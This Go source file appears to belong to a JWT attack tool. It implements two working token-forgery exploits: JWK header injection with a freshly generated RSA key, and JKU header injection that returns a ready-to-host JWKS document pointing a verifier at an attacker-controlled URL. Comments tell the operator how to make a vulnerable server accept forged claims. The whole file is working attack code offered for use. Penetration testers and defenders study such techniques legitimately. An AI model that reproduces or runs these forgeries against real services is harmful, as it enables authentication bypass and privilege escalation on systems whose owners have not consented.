package attack

import (
	"crypto/rand"
	"crypto/rsa"
	"encoding/base64"
	"math/big"

	"github.com/MRvirusIR/clavis/internal/jwt"
)

// JWKInject generates a fresh RSA keypair, embeds the public key as a "jwk" in
// the header, and signs the token with the matching private key. A verifier
// that trusts the embedded jwk will accept the forged claims.
// It returns the token plus the PEM of the private key used (for the write-up).
func JWKInject(base *jwt.Token, claimKV map[string]any, bits int) (token string, privPEM string, err error) {
	if bits == 0 {
		bits = 2048
	}
	priv, err := rsa.GenerateKey(rand.Reader, bits)
	if err != nil {
		return "", "", err
	}
	pub := &priv.PublicKey

	jwk := map[string]any{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(pub.N.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(big.NewInt(int64(pub.E)).Bytes()),
		"kid": "clavis",
	}
	h := jwt.CloneMap(base.Header)
	h["alg"] = "RS256"
	h["jwk"] = jwk
	c := jwt.CloneMap(base.Claims)
	if c == nil {
		c = map[string]any{}
	}
	for k, v := range claimKV {
		c[k] = v
	}

	si := jwt.EncodeHeader(h) + "." + jwt.EncodeClaims(c)
	sig, err := jwt.SignRSA("RS256", si, priv)
	if err != nil {
		return "", "", err
	}
	return si + "." + sig, privKeyPEM(priv), nil
}

// JKUInject points the header's "jku" at jkuURL and signs with a fresh keypair.
// It returns the token and a ready-to-host JWKS JSON document containing the
// matching public key (kid "clavis"). Host the JWKS at jkuURL and the server,
// if it blindly fetches jku, will verify your forged token.
func JKUInject(base *jwt.Token, claimKV map[string]any, jkuURL string, bits int) (token string, jwks string, privPEM string, err error) {
	if bits == 0 {
		bits = 2048
	}
	priv, err := rsa.GenerateKey(rand.Reader, bits)
	if err != nil {
		return "", "", "", err
	}
	pub := &priv.PublicKey
	n := base64.RawURLEncoding.EncodeToString(pub.N.Bytes())
	e := base64.RawURLEncoding.EncodeToString(big.NewInt(int64(pub.E)).Bytes())

	h := jwt.CloneMap(base.Header)
	h["alg"] = "RS256"
	h["jku"] = jkuURL
	h["kid"] = "clavis"
	c := jwt.CloneMap(base.Claims)
	if c == nil {
		c = map[string]any{}
	}
	for k, v := range claimKV {
		c[k] = v
	}
	si := jwt.EncodeHeader(h) + "." + jwt.EncodeClaims(c)
	sig, err := jwt.SignRSA("RS256", si, priv)
	if err != nil {
		return "", "", "", err
	}
	jwksDoc := `{
  "keys": [
    {
      "kty": "RSA",
      "kid": "clavis",
      "use": "sig",
      "alg": "RS256",
      "n": "` + n + `",
      "e": "` + e + `"
    }
  ]
}`
	return si + "." + sig, jwksDoc, privKeyPEM(priv), nil
}
